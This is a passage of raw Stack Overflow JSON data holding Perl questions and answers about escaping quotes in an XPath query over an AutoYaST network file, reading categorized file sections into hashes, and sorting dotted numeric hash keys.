"tags": [], "owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "is_accepted": false, "score": 0, "last_activity_date": 1496402364, "creation_date": 1496402364, "answer_id": 44327656, "question_id": 44327584, "link": "https://stackoverflow.com/questions/44327584/perl-iterating-through-an-xml-parent-node-for-a-particular-value-of-one-child-n/44327656#44327656", "title": "Perl: Iterating through an xml parent node for a particular value of one child node and comparing values for other child nodes under that parent node", "body": "<p>Your Problem are the nestes double quotes. You can escape them or by using backslash:</p>\n\n<pre><code>my $device_name = $doc-&gt;findnodes(\"//networking/interfaces[\\@config:type=\\\"list\\\"]/interface[$iterator]/device\");\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 7012951, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0e6fcba0fe0fa914264d95f8d9d7047d?s=128&d=identicon&r=PG", "display_name": "rahulruns", "link": "https://stackoverflow.com/users/7012951/rahulruns"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 64, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1496402364, "creation_date": 1496402129, "question_id": 44327584, "link": "https://stackoverflow.com/questions/44327584/perl-iterating-through-an-xml-parent-node-for-a-particular-value-of-one-child-n", "title": "Perl: Iterating through an xml parent node for a particular value of one child node and comparing values for other child nodes under that parent node", "body": "<p>I have an autoyast file (SLES configuration). It has entry for multiple bonds and network cards. I need to find each of whether it's type bond or NIC and then need to iterate through rest of parameters to verify if they are correct.</p>\n\n<pre><code>use strict;\nuse XML::LibXML;\n\nmy $parser = XML::LibXML-&gt;new;\nmy $doc = $parser-&gt;parse_file(\"setuplan_1.xml\");\n\nmy $count_interface = $doc-&gt;findvalue(\"count(//interface)\");\nprint \"total interface $count_interface\\n\";\nfor ( my $iterator = 1; $iterator &lt; $count_interface; $iterator++){\nprint \"Iterator value $iterator\";\nmy $device_name = $doc-&gt;findnodes(\"//networking/interfaces[\\@config:type=\"list\"]/interface[$iterator]/device\");\nif ( $device_name =~ m/bond(\\d+)/){\nprint $device_name;\n}\nelsif ( $device_name =~ m/(p(\\d+)p(\\d+)|em(\\d+))/){\nprint \"alom device\";\n}\n}\n</code></pre>\n\n<p>Sample XML document for autoyast</p>\n\n<pre><code>    &lt;networking&gt;\n    .........\n    &lt;interfaces config:type=\"list\"&gt;\n    &lt;interface&gt;\n    &lt;bonding_master&gt;yes&lt;/bonding_master&gt;\n    &lt;bonding_module_opts&gt;xxxxx&lt;/bonding_module_opts&gt;\n    &lt;bonding_slave0&gt;emxx&lt;/bonding_slave0&gt;\n    &lt;bonding_slave1&gt;pxpy&lt;/bonding_slave1&gt;\n    &lt;bootproto&gt;static&lt;/bootproto&gt;\n    &lt;device&gt;bondx&lt;/device&gt;\n    &lt;ipaddr&gt;x.x.x.x&lt;/ipaddr&gt;\n    &lt;name&gt;Management/Quorum&lt;/name&gt;\n    &lt;netmask&gt;255.255.255.0&lt;/netmask&gt;\n    &lt;startmode&gt;auto&lt;/startmode&gt;\n    &lt;usercontrol&gt;no&lt;/usercontrol&gt;\n    &lt;/interface&gt;\n    &lt;interface&gt;\n    &lt;bonding_master&gt;yes&lt;/bonding_master&gt;\n    &lt;bonding_module_opts&gt;xxxxxxxx&lt;/bonding_module_opts&gt;\n    &lt;bonding_slave0&gt;pxpy&lt;/bonding_slave0&gt;\n                &lt;bonding_slave1&gt;pxpy&lt;/bonding_slave1&gt;\n                &lt;bootproto&gt;static&lt;/bootproto&gt;\n                &lt;device&gt;bondx&lt;/device&gt;\n                &lt;ipaddr&gt;x.x.x.x&lt;/ipaddr&gt;\n                &lt;name&gt;xxxx&lt;/name&gt;\n                &lt;netmask&gt;255.255.255.0&lt;/netmask&gt;\n                &lt;startmode&gt;auto&lt;/startmode&gt;\n                &lt;usercontrol&gt;no&lt;/usercontrol&gt;\n         &lt;/interface&gt;\n             ..........\n       &lt;interface&gt;\n                &lt;bootproto&gt;none&lt;/bootproto&gt;\n                &lt;device&gt;pxpy&lt;/device&gt;\n                &lt;name&gt;This adapter is part of BOND and is disabled&lt;/name&gt;\n                &lt;startmode&gt;hotplug&lt;/startmode&gt;\n                &lt;usercontrol&gt;NO&lt;/usercontrol&gt;\n            &lt;/interface&gt;\n            &lt;interface&gt;\n                &lt;bootproto&gt;none&lt;/bootproto&gt;\n                &lt;device&gt;pxpy&lt;/device&gt;\n                &lt;name&gt;This adapter is part of BOND and is disabled&lt;/name&gt;\n                &lt;startmode&gt;hotplug&lt;/startmode&gt;\n                &lt;usercontrol&gt;NO&lt;/usercontrol&gt;\n            &lt;/interface&gt;\n        .........\n   &lt;/networking&gt;\n</code></pre>\n\n<p>In this XML file there are multiple interface tags, each for bond device and NIC cards. Based on these I need to look for other nodes in that interface and compare values to verify</p>\n\n<p>Error that I receive is </p>\n\n<pre><code>Bareword found where operator expected at autoyastcheck.pl line 13, near \"\"//networking/interfaces[\\@config:type=\"list\"\n    (Missing operator before list?)\nString found where operator expected at autoyastcheck.pl line 13, near \"list\"]/interface[$iterator]/device\"\"\nsyntax error at autoyastcheck.pl line 13, near \"\"//networking/interfaces[\\@config:type=\"list\"\nExecution of autoyastcheck.pl aborted due to compilation errors.\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 16761, "user_id": 1454708, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eSzgk.png?s=128&g=1", "display_name": "Nahuel Fouilleul", "link": "https://stackoverflow.com/users/1454708/nahuel-fouilleul"}, "edited": false, "score": 2, "creation_date": 1496404289, "post_id": 44327455, "comment_id": 75660574, "body": "is there a pattern more general which permits to recognize a category (double newlines, special charcter) ?"}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1496409875, "post_id": 44327455, "comment_id": 75664141, "body": "what is your expectation on the output.. please update"}], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496467004, "post_id": 44329049, "comment_id": 75684388, "body": "You might want to also fix the two arguments open and the global file handle. It&#39;s always useful to promote best practices. :-)"}, {"owner": {"reputation": 137, "user_id": 8102349, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a69396b9faef27629c858af092faeada?s=128&d=identicon&r=PG&f=1", "display_name": "tt_pre", "link": "https://stackoverflow.com/users/8102349/tt-pre"}, "edited": false, "score": 0, "creation_date": 1497004815, "post_id": 44329049, "comment_id": 75907540, "body": "I updated the question. could you please check back. thanks."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user1919238"}, "is_accepted": false, "score": 1, "last_activity_date": 1496406705, "creation_date": 1496406705, "answer_id": 44329049, "question_id": 44327455, "link": "https://stackoverflow.com/questions/44327455/best-practice-to-read-a-file-and-categorize-it-into-multiple-hash/44329049#44329049", "title": "Best practice to read a file and categorize it into multiple hash", "body": "<p>Your code appears to implement the logic:</p>\n\n<ul>\n<li>If there is a category name, skip a few lines.</li>\n<li>Otherwise, insert everything else into the hash (without regard for what category it was in).</li>\n</ul>\n\n<p>You could do that more simply with something like this:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy %hash;\n\nmy %categories = (\n   'myCategory1' =&gt; 1,\n   'myCategory2' =&gt; 1,\n   'myCategory3' =&gt; 1,\n);\n\nwhile(my $line=&lt;FHIN&gt;){\n   chomp($line);\n   if(exists $categories{$line}){\n        #Skip two lines.\n        &lt;FHIN&gt; for (1..2);\n   }\n   else{\n      my @sub_str = split(' ',$line);\n      my $temp_key=$sub_str[2].$sub_str[5].$sub_str[6];\n      $hash{$temp_key}=$sub_str[1];\n   }\n}\n</code></pre>\n\n<p>Alternatively, if you could come up with a regex that will detect each category, you could use that and do away with the categories hash.</p>\n\n<p>For example, is a category the only time that a word appears on a line by itself with no spaces?  If so, you could do:</p>\n\n<pre><code>   if($line =~ /^\\w+$/){\n</code></pre>\n\n<p>instead of:</p>\n\n<pre><code>   if(exists $categories{$line}){\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1496467044, "post_id": 44330302, "comment_id": 75684392, "body": "You might want to also fix the two arguments open and the global file handle. It&#39;s always useful to promote best practices. :-)"}, {"owner": {"reputation": 137, "user_id": 8102349, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a69396b9faef27629c858af092faeada?s=128&d=identicon&r=PG&f=1", "display_name": "tt_pre", "link": "https://stackoverflow.com/users/8102349/tt-pre"}, "edited": false, "score": 0, "creation_date": 1497004782, "post_id": 44330302, "comment_id": 75907523, "body": "I updated the question. Could you please check back. thanks."}], "tags": [], "owner": {"reputation": 1009, "user_id": 2051109, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/216009d45e1b8e34f936173142f0648f?s=128&d=identicon&r=PG", "display_name": "BOC", "link": "https://stackoverflow.com/users/2051109/boc"}, "is_accepted": false, "score": 2, "last_activity_date": 1497014114, "last_edit_date": 1497014114, "creation_date": 1496410588, "answer_id": 44330302, "question_id": 44327455, "link": "https://stackoverflow.com/questions/44327455/best-practice-to-read-a-file-and-categorize-it-into-multiple-hash/44330302#44330302", "title": "Best practice to read a file and categorize it into multiple hash", "body": "<p>I think the desired structure is to have a single loop that loops over the file and that uses state variables to decide its behaviour.</p>\n\n<p>I have updated the code for the updated requirement: the beginning of a category is identified using a pattern. The filter (desired_category) allows to ignore the irrelevant categories.</p>\n\n<pre><code>my %hash;\n\nmy %desired_categories = map {($_ =&gt; 1)} qw(myCategory1 myCategory3);\n\nprocess_file ('data2.txt');\nsub process_file {\n    my $filename = shift;\n    my $current_category;\n\n    open (my $fhin, '&lt;', $filename) or die \"Can't open $filename: $!\";\n    while(my $line=&lt;$fhin&gt;){\n        chomp($line);\n        # match pattern of the start of a new category\n        if ($line =~ m/^myCategory/) {\n            $current_category = $line;\n            print \"Start $current_category\\n\";\n            map {scalar &lt;$fhin&gt;} 0..2; # skip three lines\n        } elsif (exists $desired_categories{$current_category}) {\n            my ($val, undef, $key1, undef, undef, $key2, $key3) = split ' ', $line;\n            $hash{\"$key1$key2$key3\"} = $val;\n            print \"$key1$key2$key3 -&gt; $val\\n\";\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 137, "user_id": 8102349, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a69396b9faef27629c858af092faeada?s=128&d=identicon&r=PG&f=1", "display_name": "tt_pre", "link": "https://stackoverflow.com/users/8102349/tt-pre"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1532441165, "creation_date": 1496401683, "last_edit_date": 1532441165, "question_id": 44327455, "link": "https://stackoverflow.com/questions/44327455/best-practice-to-read-a-file-and-categorize-it-into-multiple-hash", "title": "Best practice to read a file and categorize it into multiple hash", "body": "<p>Say I have a file as follwing</p>\n\n<pre><code>myCategory1\nskip some lines from reading\nthings that I want in the hash for myCategory2\nthings that I want in the hash for myCategory2\n...\nmyCategory2\nskip some lines from reading\nthings that I want in the hash for myCategory3\nthings that I want in the hash for myCategory3\n...\nmyCategory3\nskip some lines from reading\nthings that I want in the hash for myCategory1\nthings that I want in the hash for myCategory1\n...\n</code></pre>\n\n<p>Now, I read the file with filehandle. The code in pseudo-format.</p>\n\n<pre><code>while(my $line=&lt;FHIN&gt;){\n  chomp($line);\n  if($line=~ /^myCategory1$/){\n    $line=&lt;FHIN&gt;;           # get rid of unwanted line\n    chomp($line);\n    $line=&lt;FHIN&gt;;           # get rid of unwanted line\n    chomp($line);\n    $line=&lt;FHIN&gt;;           # this is the line of interest\n    chomp($line);\n    do{\n      @sub_str = split(' ',$line);\n      $temp_key=$sub_str[2].$sub_str[5].$sub_str[6]; #dummy assignment\n      $hash{$temp_key}=$sub_str[1]; #dummy assignment\n      $line=&lt;FHIN&gt;;         # this line cotains r.*\n      chomp($line);\n    }while((defined($line))&amp;&amp;($line !~ /^myCategory2*$/));\n\n  }\n  if($line=~ /^myCategory2$/){\n    $line=&lt;FHIN&gt;;           # get rid of unwanted line\n    chomp($line);\n    $line=&lt;FHIN&gt;;           # get rid of unwanted line\n    chomp($line);\n    $line=&lt;FHIN&gt;;           # this is the line of interest\n    chomp($line);\n    do{\n      @sub_str = split(' ',$line);\n      $temp_key=$sub_str[2].$sub_str[5].$sub_str[6]; #dummy assignment\n      $hash{$temp_key}=$sub_str[1]; #dummy assignment\n      $line=&lt;FHIN&gt;;         # this line cotains r.*\n      chomp($line);\n    }while((defined($line))&amp;&amp;($line !~ /^myCategory3*$/));\n\n  }\n}\n</code></pre>\n\n<p>The idea is to look for Category1.....3 and capture the in between lines for further processing. Now, if I have 10 files to process each having 50 categories, according to my code, I will need 1 while loops each having 50 if..else blocks for each file, completely hard coded. How do I generalize/reduce the number of lines in my codes, that do exactly the same thing. If my question is not clear, feel free to ask!\nThanks.</p>\n\n<p><strong>EDIT</strong>\nThanks for the answers. Let me rephrase on what I need. </p>\n\n<ol>\n<li>Every line of file does not contain \"myCategory*\"</li>\n<li>There is a pattern to grep for \"myCategory*\"</li>\n<li>I want to catch the lines that lies within two consecutive \"myCategory*\". So, for example, @Category_1 will have all the lines between \"myCategory1\" and \"myCategory2\"</li>\n<li>How should I approach if I read the entire file into a single array and then operate based on categories.</li>\n</ol>\n"}, {"tags": ["perl", "sorting"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1496396181, "post_id": 44325420, "comment_id": 75655604, "body": "How does it come out? What&#39;s not working? Please <a href=\"https://stackoverflow.com/posts/44325420/edit\">edit</a> your question and include how it&#39;s wrong."}, {"owner": {"reputation": 137, "user_id": 8102349, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a69396b9faef27629c858af092faeada?s=128&d=identicon&r=PG&f=1", "display_name": "tt_pre", "link": "https://stackoverflow.com/users/8102349/tt-pre"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496398107, "post_id": 44325420, "comment_id": 75656769, "body": "It came out as: <code>m2-10.10845.857-10.3145.857 m2-10.3145.857-10.42545.857 m2-10.42545.857-10.62845.857 m2-10.62845.857-10.83645.857 m2-11.60745.857-12.11745.857 m2-7.80945.857-8.01645.857 m2-8.01645.857-8.13145.857 m2-8.13145.857-8.24645.857 m2-8.24645.857-8.44345.857 m2-8.44345.857-9.7945.857 m2-9.7945.857-9.90545.857 m2-9.90545.857-10.10845.857</code>"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1496398191, "post_id": 44325420, "comment_id": 75656823, "body": "<a href=\"https://stackoverflow.com/posts/44325420/edit\">edit</a> your question with further information."}], "answers": [{"comments": [{"owner": {"reputation": 137, "user_id": 8102349, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a69396b9faef27629c858af092faeada?s=128&d=identicon&r=PG&f=1", "display_name": "tt_pre", "link": "https://stackoverflow.com/users/8102349/tt-pre"}, "edited": false, "score": 0, "creation_date": 1496398309, "post_id": 44326031, "comment_id": 75656899, "body": "Thanks! This works perfect! I just tweaked a bit according to my requirement."}, {"owner": {"reputation": 137, "user_id": 8102349, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a69396b9faef27629c858af092faeada?s=128&d=identicon&r=PG&f=1", "display_name": "tt_pre", "link": "https://stackoverflow.com/users/8102349/tt-pre"}, "edited": false, "score": 0, "creation_date": 1496399684, "post_id": 44326031, "comment_id": 75657703, "body": "could you please translate the return statement to English language? To be precise, what is the role of &quot;||&quot; here?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1496400801, "post_id": 44326031, "comment_id": 75658414, "body": "<code>||</code> is the &#39;or&#39; operator. If you do &#39;a OR b&#39; then if a is &quot;true&quot; then you don&#39;t need to evaluate B - the expression is true. So in a return statement - it processes each statement in order, and if they are &#39;true&#39; - which in this contexts, means returning <i>either</i> <code>-1</code> or <code>1</code> (but not zero) then that&#39;s the value that&#39;s returned. Otherwise it&#39;s still not sure if &#39;or&#39; is true or false, so it has to evaluate the next slice of the expression."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 137, "user_id": 8102349, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a69396b9faef27629c858af092faeada?s=128&d=identicon&r=PG&f=1", "display_name": "tt_pre", "link": "https://stackoverflow.com/users/8102349/tt-pre"}, "edited": false, "score": 0, "creation_date": 1496401525, "post_id": 44326031, "comment_id": 75658828, "body": "@tt_pre  It&#39;s very late here, so just a comment now. I&#39;ll edit later.  The <code>$x &lt;=&gt; $y</code> returns <code>1</code> if <code>$x</code> is greater than <code>$y</code>, if the other way round it returns <code>-1</code>, and if they are equal a <code>0</code>.  If we get <code>1</code> or <code>-1</code> that is the result (since <code>||</code> short-circuits), but if it&#39;s <code>0</code> that is false and the statement continues to the next condition, after <code>||</code>.  So you can chain them like that."}, {"owner": {"reputation": 137, "user_id": 8102349, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a69396b9faef27629c858af092faeada?s=128&d=identicon&r=PG&f=1", "display_name": "tt_pre", "link": "https://stackoverflow.com/users/8102349/tt-pre"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1496401909, "post_id": 44326031, "comment_id": 75659054, "body": "@Sobrique and zdim Thanks for the explanation. It&#39;s clear now."}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1496401959, "post_id": 44326031, "comment_id": 75659082, "body": "From the desired output, it looks to me like it should <i>not</i> sort numerically"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1496423174, "post_id": 44326031, "comment_id": 75671950, "body": "@ysth I just noticed (after seeing your comment) that the 4th and 5th line are switched (in the sense of sort I posted) -- is that what you mean?"}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1496428773, "post_id": 44326031, "comment_id": 75674761, "body": "That&#39;s not how I think of it, but yes."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1496448740, "post_id": 44326031, "comment_id": 75681700, "body": "@ysth Heh, I don&#39;t see how else to sort for the shown desired output; I can imagine a posting error though, since all else fits. Sorting like one does IP&#39;s doesn&#39;t change the output (and, it&#39;s twice-not IPs).  I&#39;ll look more, it seems that you have something in mind :)"}, {"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1496451216, "post_id": 44326031, "comment_id": 75682096, "body": "Just cmp, not &lt;=&gt;"}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 1, "last_activity_date": 1496464002, "last_edit_date": 1496464002, "creation_date": 1496397350, "answer_id": 44326031, "question_id": 44325420, "link": "https://stackoverflow.com/questions/44325420/how-do-i-sort-keys-of-hash-alphanumeric-with-and/44326031#44326031", "title": "how do I sort keys of hash alphanumeric with &quot;=&quot; and &quot;.&quot;", "body": "<p>Both examples shown in the question sort by comparing <em>values</em>, not keys. I will use the statement, to sort by keys.  For simplicity we can think of the problem of sorting an array with given elements.</p>\n\n<p>It seems that you want to sort by the first number, then by the second, then by the third. The second set of numbers (after the second <code>-</code>) seems to not matter. Also, as it's always <code>m2</code> I'll disregard it.</p>\n\n<p>For sorting by numbers we use numerical sort (<code>&lt;=&gt;</code>), not lexicographical (<code>cmp</code>).</p>\n\n<p>Then break the first set of numbers into its components and sort</p>\n\n<pre><code>foreach my $key ( sort { by_component($a, $b) } (keys %h) ) {\n    print \"$key\\n\";\n}\n\nsub by_component {\n    my ($aa, $bb) = @_; \n\n    my @num_aa = split /\\./, (split /-/, $aa)[1];    #/\n    my @num_bb = split /\\./, (split /-/, $bb)[1];\n\n    return\n        $num_bb[0] &lt;=&gt; $num_aa[0] ||\n        $num_bb[1] &lt;=&gt; $num_aa[1] ||\n        $num_bb[2] &lt;=&gt; $num_aa[2];\n}\n</code></pre>\n\n<p>The <code>&lt;=&gt;</code> operator returns <code>1</code> if its left operand is greater than the right, <code>0</code> if they're equal, or <code>-1</code> if right is greater.  Both <code>1</code> or <code>-1</code> are \"true\" so the whole expression is true and <em>that value</em> is returned. The <code>0</code> is false and then the next condition after <code>||</code> is evaluated -- we sort by the next number if the first pair is equal.</p>\n\n<p>This prints the desired order of keys.</p>\n\n<p>See <a href=\"https://perldoc.perl.org/functions/sort.html\" rel=\"nofollow noreferrer\">sort</a> and <a href=\"http://perldoc.perl.org/perlop.html#Equality-Operators\" rel=\"nofollow noreferrer\"><code>&lt;=&gt;</code> and <code>cmp</code> operators</a>, and <a href=\"http://perldoc.perl.org/perlop.html#Logical-Defined-Or\" rel=\"nofollow noreferrer\">logical operators</a> for their behavior described above.</p>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1496398066, "creation_date": 1496398066, "answer_id": 44326295, "question_id": 44325420, "link": "https://stackoverflow.com/questions/44325420/how-do-i-sort-keys-of-hash-alphanumeric-with-and/44326295#44326295", "title": "how do I sort keys of hash alphanumeric with &quot;=&quot; and &quot;.&quot;", "body": "<p><code>sort</code> takes any function that returns positional comparators for <code>$a</code> and <code>$b</code>. </p>\n\n<p>I would suggest what you're trying to do is decompose your strings into fields, and compare 'field by field' to sort. I've chosen to 'handle' the string comparison in my example, but as they're all 'm2' prefixed, that's not having any impact on the results. Note - everything is 'descending' order in my example, so 'm1' will be lower down than 'm3', the same as '7' is lower down the order than '11'. </p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nsub custom_sort {\n   my @a_keys = split /[-\\.]/, $a;\n   my @b_keys = split /[-\\.]/, $b;\n\n   #check each key until 'array' is empty. \n   while ( @a_keys and @b_keys ) {\n      #if both are numeric, compare numerically.\n      if (   $a_keys[0] =~ /^\\d+$/\n         and $b_keys[0] =~ /^\\d+$/ )\n      {\n\n         my $comparison = shift @b_keys &lt;=&gt; shift @a_keys;\n         #returns a result if it's anything other than '0' e.g. they're the same. \n         return $comparison if $comparison;\n      }\n      else {\n         #compare stringwise. \n         my $comparison = shift @b_keys cmp shift @a_keys;\n         return $comparison if $comparison;\n      }\n   }\n   #fell through all the comparisons, so identical. \n   return 0;\n}\n\nchomp ( my @values  = &lt;DATA&gt; );\nprint join (\"\\n\", sort {custom_sort} @values ), \"\\n\";\n\n\n__DATA__\nm2-10.10845.857-10.3145.857 \nm2-10.3145.857-10.42545.857\nm2-10.42545.857-10.62845.857\nm2-10.62845.857-10.83645.857\nm2-11.60745.857-12.11745.857\nm2-7.80945.857-8.01645.857\nm2-8.01645.857-8.13145.857\nm2-8.13145.857-8.24645.857\nm2-8.24645.857-8.44345.857\nm2-8.44345.857-9.7945.857\nm2-9.7945.857-9.90545.857\nm2-9.90545.857-10.10845.857\n</code></pre>\n\n<p>This works through the value, one 'field' at a time, and compares them - moving onto the next if the 'comparison' is zero (e.g.  they're equal). </p>\n\n<p>Which gives as output:</p>\n\n<pre><code>m2-11.60745.857-12.11745.857\nm2-10.62845.857-10.83645.857\nm2-10.42545.857-10.62845.857\nm2-10.10845.857-10.3145.857 \nm2-10.3145.857-10.42545.857\nm2-9.90545.857-10.10845.857\nm2-9.7945.857-9.90545.857\nm2-8.44345.857-9.7945.857\nm2-8.24645.857-8.44345.857\nm2-8.13145.857-8.24645.857\nm2-8.01645.857-8.13145.857\nm2-7.80945.857-8.01645.857\n</code></pre>\n"}], "owner": {"reputation": 137, "user_id": 8102349, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/a69396b9faef27629c858af092faeada?s=128&d=identicon&r=PG&f=1", "display_name": "tt_pre", "link": "https://stackoverflow.com/users/8102349/tt-pre"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 167, "favorite_count": 1, "accepted_answer_id": 44326031, "answer_count": 2, "score": 1, "last_activity_date": 1496464002, "creation_date": 1496395754, "last_edit_date": 1496396300, "question_id": 44325420, "link": "https://stackoverflow.com/questions/44325420/how-do-i-sort-keys-of-hash-alphanumeric-with-and", "title": "how do I sort keys of hash alphanumeric with &quot;=&quot; and &quot;.&quot;", "body": "<p>I have a hash which has keys as following:</p>\n\n<pre><code>m2-10.10845.857-10.3145.857 \nm2-10.3145.857-10.42545.857\nm2-10.42545.857-10.62845.857\nm2-10.62845.857-10.83645.857\nm2-11.60745.857-12.11745.857\nm2-7.80945.857-8.01645.857\nm2-8.01645.857-8.13145.857\nm2-8.13145.857-8.24645.857\nm2-8.24645.857-8.44345.857\nm2-8.44345.857-9.7945.857\nm2-9.7945.857-9.90545.857\nm2-9.90545.857-10.10845.857\n</code></pre>\n\n<p>I want to sort them in a way that they appear as following:</p>\n\n<pre><code>m2-11.60745.857-12.11745.857\nm2-10.62845.857-10.83645.857\nm2-10.42545.857-10.62845.857\nm2-10.3145.857-10.42545.857\nm2-10.10845.857-10.3145.857\nm2-9.90545.857-10.10845.857\nm2-9.7945.857-9.90545.857\nm2-8.44345.857-9.7945.857\nm2-8.24645.857-8.44345.857\nm2-8.13145.857-8.24645.857\nm2-8.01645.857-8.13145.857\nm2-7.80945.857-8.01645.857\n</code></pre>\n\n<p>I tried with </p>\n\n<pre><code>foreach my $key(sort {$h{$a} cmp $h{$b} } keys %h){\n  printf FHOUT 